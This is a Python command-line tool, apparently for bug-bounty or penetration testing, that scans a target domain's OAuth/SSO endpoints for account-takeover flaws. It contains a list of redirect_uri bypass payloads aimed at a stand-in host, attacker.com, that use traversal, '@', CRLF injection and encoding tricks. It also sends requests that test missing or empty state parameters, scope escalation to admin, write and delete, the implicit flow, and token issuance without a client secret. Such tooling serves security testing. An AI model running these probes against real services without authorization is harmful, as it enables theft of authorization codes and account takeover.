#!/usr/bin/env python3
"""
OAuth Flow Tester — OAuth/SSO Vulnerability Detection

Tests for common OAuth misconfigurations that lead to account takeover:
- redirect_uri manipulation (open redirect → token theft)
- State parameter missing/predictable (CSRF → ATO)
- Scope escalation (request more permissions than allowed)
- Token leakage in referrer/URL fragments
- Authorization code reuse
- Client secret exposure
- PKCE bypass

Usage:
    python3 oauth_tester.py --auth-url "https://target.com/oauth/authorize" \
        --client-id "abc123" --redirect-uri "https://target.com/callback"
    python3 oauth_tester.py --target target.com --auto-discover
"""

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse, parse_qs, urlencode, quote

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FINDINGS_DIR = os.path.join(BASE_DIR, "findings")

GREEN = "\033[0;32m"
RED = "\033[0;31m"
YELLOW = "\033[1;33m"
CYAN = "\033[0;36m"
BOLD = "\033[1m"
NC = "\033[0m"


def log(level, msg):
    colors = {"ok": GREEN, "err": RED, "warn": YELLOW, "info": CYAN, "vuln": RED}
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "vuln": "🔴"}
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {colors.get(level, '')}{BOLD}[{symbols.get(level, '*')}]{NC} {msg}")


def http_request(url, method="GET", headers=None, data=None, follow_redirects=False, timeout=10):
    """HTTP request that can optionally NOT follow redirects."""
    default_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/json",
    }
    if headers:
        default_headers.update(headers)

    try:
        if data and isinstance(data, dict):
            data = urlencode(data).encode()
        elif data and isinstance(data, str):
            data = data.encode()

        req = Request(url, data=data, headers=default_headers, method=method)

        if not follow_redirects:
            # Custom opener that doesn't follow redirects
            import urllib.request
            class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None

            opener = urllib.request.build_opener(NoRedirectHandler)
            try:
                resp = opener.open(req, timeout=timeout)
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": resp.read().decode("utf-8", errors="replace"),
                    "url": resp.url,
                }
            except HTTPError as e:
                location = e.headers.get("Location", "")
                body = ""
                try:
                    body = e.read().decode("utf-8", errors="replace")
                except Exception:
                    pass
                return {
                    "status": e.code,
                    "headers": dict(e.headers),
                    "body": body,
                    "url": url,
                    "redirect_to": location,
                }
        else:
            with urlopen(req, timeout=timeout) as resp:
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": resp.read().decode("utf-8", errors="replace"),
                    "url": resp.url,
                }
    except HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return {"status": e.code, "headers": dict(e.headers) if hasattr(e, 'headers') else {}, "body": body, "url": url}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": str(e), "url": url}


# redirect_uri bypass payloads
REDIRECT_URI_BYPASSES = [
    # Open redirect on same domain
    ("{redirect_uri}/../../../attacker.com", "path traversal"),
    ("{redirect_uri}@attacker.com", "@ bypass"),
    ("{redirect_uri}.attacker.com", "subdomain append"),
    ("{redirect_uri}%0d%0aLocation:%20https://attacker.com", "CRLF injection"),
    ("{redirect_uri}?next=https://attacker.com", "parameter injection"),
    ("{redirect_uri}#@attacker.com", "fragment bypass"),
    ("{redirect_uri}/../../attacker.com", "double traversal"),

    # Scheme manipulation
    ("https://attacker.com", "full replacement"),
    ("//attacker.com", "protocol-relative"),
    ("https://attacker.com%23{redirect_uri}", "fragment trick"),
    ("https://attacker.com%2f{redirect_uri}", "encoded slash"),

    # Domain confusion
    ("{base_domain}.attacker.com", "subdomain prepend"),
    ("https://attacker.com/{base_domain}", "path append"),
    ("{redirect_uri}%252f%252fattacker.com", "double encode"),

    # Localhost tricks
    ("http://localhost", "localhost"),
    ("http://127.0.0.1", "loopback"),
    ("http://0.0.0.0", "all interfaces"),
]


class OAuthTester:
    """Tests OAuth/SSO flows for vulnerabilities."""

    def __init__(self, auth_url=None, client_id=None, redirect_uri=None,
                 target=None, rate_limit=2.0):
        self.auth_url = auth_url
        self.client_id = client_id
        self.redirect_uri = redirect_uri
        self.target = target
        self.rate_limit = rate_limit
        self.findings = []
        self.base_domain = ""

        if redirect_uri:
            parsed = urlparse(redirect_uri)
            self.base_domain = parsed.netloc

    def _sleep(self):
        if self.rate_limit > 0:
            time.sleep(1.0 / self.rate_limit)

    def _add_finding(self, vuln_type, severity, details, poc_url=None, response=None):
        finding = {
            "type": vuln_type,
            "severity": severity,
            "details": details,
            "poc_url": poc_url,
            "response_status": response.get("status") if response else None,
            "redirect_to": response.get("redirect_to", "") if response else "",
            "found_at": datetime.now().isoformat(),
        }
        self.findings.append(finding)
        log("vuln", f"[{severity}] {vuln_type}: {details[:80]}")

    def auto_discover(self):
        """Find OAuth endpoints on the target."""
        if not self.target:
            log("err", "Need --target for auto-discovery")
            return

        log("info", f"Auto-discovering OAuth endpoints on {self.target}...")

        # Common OAuth endpoint paths
        oauth_paths = [
            "/oauth/authorize", "/oauth2/authorize", "/oauth/auth",
            "/auth/authorize", "/authorize",
            "/oauth/token", "/oauth2/token",
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/api/oauth/authorize", "/api/v1/oauth/authorize",
            "/login/oauth/authorize", "/o/authorize",
            "/connect/authorize",
        ]

        found = []
        for path in oauth_paths:
            url = f"https://{self.target}{path}"
            resp = http_request(url)
            self._sleep()

            if resp["status"] in (200, 302, 301, 400, 401):
                body = resp["body"]
                redirect = resp.get("redirect_to", "")

                # Check if it's actually an OAuth endpoint
                is_oauth = any(kw in (body + redirect).lower() for kw in [
                    "client_id", "redirect_uri", "response_type",
                    "authorization_endpoint", "token_endpoint",
                    "oauth", "openid",
                ])

                if is_oauth:
                    log("ok", f"Found OAuth endpoint: {path} (HTTP {resp['status']})")
                    found.append({"path": path, "url": url, "status": resp["status"]})

                    # Try to extract client_id from the page
                    client_ids = re.findall(r'client_id[=:"\s]+([a-zA-Z0-9_\-]+)', body)
                    if client_ids:
                        log("ok", f"  Found client_id: {client_ids[0]}")
                        if not self.client_id:
                            self.client_id = client_ids[0]

                    # OpenID configuration gives us everything
                    if "well-known" in path and resp["status"] == 200:
                        try:
                            config = json.loads(body)
                            if config.get("authorization_endpoint"):
                                self.auth_url = config["authorization_endpoint"]
                                log("ok", f"  Auth URL: {self.auth_url}")
                            if config.get("token_endpoint"):
                                log("ok", f"  Token URL: {config['token_endpoint']}")
                        except json.JSONDecodeError:
                            pass

        if not found:
            log("warn", "No OAuth endpoints found")
        else:
            log("ok", f"Discovered {len(found)} OAuth endpoints")
            if not self.auth_url and found:
                self.auth_url = found[0]["url"]

        return found

    def test_redirect_uri(self):
        """Test redirect_uri manipulation for token theft."""
        if not self.auth_url:
            log("warn", "No auth_url — skipping redirect_uri tests")
            return

        log("info", "Testing redirect_uri manipulation...")

        for payload_template, technique in REDIRECT_URI_BYPASSES:
            payload = payload_template.replace(
                "{redirect_uri}", self.redirect_uri or ""
            ).replace(
                "{base_domain}", self.base_domain or ""
            )

            # Build OAuth authorize URL with manipulated redirect_uri
            params = {
                "response_type": "code",
                "client_id": self.client_id or "test",
                "redirect_uri": payload,
                "scope": "openid",
                "state": "test123",
            }

            url = f"{self.auth_url}?{urlencode(params)}"
            resp = http_request(url, follow_redirects=False)
            self._sleep()

            # Check if redirect was accepted (not rejected)
            if resp["status"] in (302, 301, 303):
                redirect_to = resp.get("redirect_to", "")
                # If it redirected to our payload URL, that's a finding
                if "attacker.com" in redirect_to or payload in redirect_to:
                    self._add_finding(
                        "OAUTH_REDIRECT_URI_BYPASS", "HIGH",
                        f"redirect_uri accepted malicious value via '{technique}'. "
                        f"Attacker can steal authorization codes/tokens. "
                        f"Payload: {payload[:80]}",
                        poc_url=url,
                        response=resp,
                    )
                elif redirect_to and "error" not in redirect_to.lower():
                    log("info", f"  [{technique}] Redirected to: {redirect_to[:60]}")

            elif resp["status"] == 200:
                body = resp["body"]
                # Check if the page shows a consent screen (redirect_uri was accepted)
                if any(kw in body.lower() for kw in ["approve", "allow", "consent", "authorize"]):
                    self._add_finding(
                        "OAUTH_REDIRECT_URI_BYPASS", "HIGH",
                        f"redirect_uri accepted via '{technique}' — consent page shown. "
                        f"Payload: {payload[:80]}",
                        poc_url=url,
                        response=resp,
                    )

    def test_state_parameter(self):
        """Test for missing/weak state parameter (CSRF → ATO)."""
        if not self.auth_url:
            return

        log("info", "Testing state parameter...")

        # Test 1: No state parameter at all
        params = {
            "response_type": "code",
            "client_id": self.client_id or "test",
            "redirect_uri": self.redirect_uri or "",
        }

        url = f"{self.auth_url}?{urlencode(params)}"
        resp = http_request(url, follow_redirects=False)
        self._sleep()

        if resp["status"] in (200, 302, 301) and "error" not in resp.get("body", "").lower():
            redirect_to = resp.get("redirect_to", "")
            if "state" not in redirect_to:
                self._add_finding(
                    "OAUTH_MISSING_STATE", "MEDIUM",
                    "OAuth flow works without state parameter — vulnerable to CSRF. "
                    "Attacker can force victim to link attacker's account.",
                    poc_url=url,
                    response=resp,
                )

        # Test 2: Empty state
        params["state"] = ""
        url = f"{self.auth_url}?{urlencode(params)}"
        resp = http_request(url, follow_redirects=False)
        self._sleep()

        if resp["status"] in (200, 302) and "error" not in resp.get("body", "").lower():
            self._add_finding(
                "OAUTH_EMPTY_STATE", "MEDIUM",
                "OAuth flow accepts empty state parameter.",
                poc_url=url,
                response=resp,
            )

    def test_scope_escalation(self):
        """Test if extra scopes can be requested."""
        if not self.auth_url:
            return

        log("info", "Testing scope escalation...")

        escalated_scopes = [
            "openid profile email admin",
            "openid profile email write",
            "openid profile email delete",
            "read write admin",
            "user:email user:admin",
            "openid profile email offline_access",
        ]

        for scope in escalated_scopes:
            params = {
                "response_type": "code",
                "client_id": self.client_id or "test",
                "redirect_uri": self.redirect_uri or "",
                "scope": scope,
                "state": "test123",
            }

            url = f"{self.auth_url}?{urlencode(params)}"
            resp = http_request(url, follow_redirects=False)
            self._sleep()

            if resp["status"] in (200, 302):
                body = resp.get("body", "")
                redirect = resp.get("redirect_to", "")
                if "error" not in body.lower() and "invalid_scope" not in (body + redirect).lower():
                    log("info", f"  Scope '{scope}' not rejected (HTTP {resp['status']})")
                    if "admin" in scope or "write" in scope or "delete" in scope:
                        self._add_finding(
                            "OAUTH_SCOPE_ESCALATION", "HIGH",
                            f"Elevated scope '{scope}' accepted without error. "
                            f"May grant unauthorized permissions.",
                            poc_url=url,
                            response=resp,
                        )

    def test_response_type(self):
        """Test implicit flow (token in URL fragment = leak risk)."""
        if not self.auth_url:
            return

        log("info", "Testing response_type manipulation...")

        # Test implicit flow (token directly in URL)
        params = {
            "response_type": "token",
            "client_id": self.client_id or "test",
            "redirect_uri": self.redirect_uri or "",
            "scope": "openid",
            "state": "test123",
        }

        url = f"{self.auth_url}?{urlencode(params)}"
        resp = http_request(url, follow_redirects=False)
        self._sleep()

        if resp["status"] in (200, 302):
            redirect = resp.get("redirect_to", "")
            body = resp.get("body", "")
            if "error" not in (body + redirect).lower():
                self._add_finding(
                    "OAUTH_IMPLICIT_FLOW", "MEDIUM",
                    "Implicit flow (response_type=token) is enabled. "
                    "Tokens exposed in URL fragments — vulnerable to referrer leakage.",
                    poc_url=url,
                    response=resp,
                )

        # Test token+code (hybrid flow — sometimes leaks both)
        params["response_type"] = "code token"
        url = f"{self.auth_url}?{urlencode(params)}"
        resp = http_request(url, follow_redirects=False)
        self._sleep()

        if resp["status"] in (200, 302):
            redirect = resp.get("redirect_to", "")
            if "error" not in resp.get("body", "").lower() and "error" not in redirect.lower():
                log("info", f"  Hybrid flow (code+token) accepted")

    def test_token_endpoint(self):
        """Test token endpoint for auth code reuse and PKCE bypass."""
        if not self.target:
            return

        log("info", "Testing token endpoint...")

        # Common token endpoint paths
        token_paths = [
            "/oauth/token", "/oauth2/token", "/token",
            "/api/oauth/token", "/connect/token",
        ]

        for path in token_paths:
            url = f"https://{self.target}{path}"

            # Test: POST without client_secret (public client impersonation)
            data = {
                "grant_type": "authorization_code",
                "code": "test_code_123",
                "redirect_uri": self.redirect_uri or f"https://{self.target}/callback",
                "client_id": self.client_id or "test",
            }

            resp = http_request(url, method="POST", data=data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"})
            self._sleep()

            if resp["status"] in (200, 400, 401):
                body = resp["body"]
                # If we get something other than "invalid_client", the endpoint exists
                if resp["status"] == 200 and "access_token" in body:
                    self._add_finding(
                        "OAUTH_NO_CLIENT_AUTH", "CRITICAL",
                        f"Token endpoint {path} issues tokens without client_secret!",
                        poc_url=url,
                        response=resp,
                    )
                elif "invalid_grant" in body or "invalid_code" in body:
                    # Endpoint exists but correctly validates the code
                    log("info", f"  Token endpoint found at {path} (validates properly)")

    def run_all(self):
        """Run all OAuth tests."""
        print(f"\n{BOLD}{'='*60}{NC}")
        print(f"{BOLD}  OAuth/SSO Vulnerability Tester{NC}")
        print(f"{'='*60}\n")

        if self.target and not self.auth_url:
            self.auto_discover()

        self.test_redirect_uri()
        self.test_state_parameter()
        self.test_scope_escalation()
        self.test_response_type()
        self.test_token_endpoint()

        return self.findings

    def print_summary(self):
        print(f"\n{BOLD}{'='*60}{NC}")
        print(f"{BOLD}  OAuth Test Summary{NC}")
        print(f"{'='*60}\n")

        if self.findings:
            for f in self.findings:
                color = RED if f["severity"] in ("CRITICAL", "HIGH") else YELLOW
                print(f"  {color}[{f['severity']}] {f['type']}{NC}")
                print(f"    {f['details'][:100]}")
                if f.get("poc_url"):
                    print(f"    PoC: {f['poc_url'][:80]}")
        else:
            print(f"  {GREEN}No OAuth vulnerabilities found ✓{NC}")
        print()

    def save_findings(self, target_name):
        if not self.findings:
            return
        output_dir = os.path.join(FINDINGS_DIR, target_name)
        os.makedirs(output_dir, exist_ok=True)
        filepath = os.path.join(output_dir, "oauth_findings.json")
        with open(filepath, "w") as f:
            json.dump({"findings": self.findings}, f, indent=2)
        log("ok", f"Saved {len(self.findings)} findings to {filepath}")


def main():
    parser = argparse.ArgumentParser(description="OAuth/SSO Vulnerability Tester")
    parser.add_argument("--target", help="Target domain for auto-discovery")
    parser.add_argument("--auth-url", help="OAuth authorization URL")
    parser.add_argument("--client-id", help="OAuth client_id")
    parser.add_argument("--redirect-uri", help="Legitimate redirect_uri")
    parser.add_argument("--auto-discover", action="store_true", help="Auto-discover OAuth endpoints")
    parser.add_argument("--rate-limit", type=float, default=2.0)
    args = parser.parse_args()

    tester = OAuthTester(
        auth_url=args.auth_url,
        client_id=args.client_id,
        redirect_uri=args.redirect_uri,
        target=args.target,
        rate_limit=args.rate_limit,
    )

    tester.run_all()
    tester.print_summary()
    target_name = args.target or urlparse(args.auth_url or "").netloc
    if target_name:
        tester.save_findings(target_name)


if __name__ == "__main__":
    main()
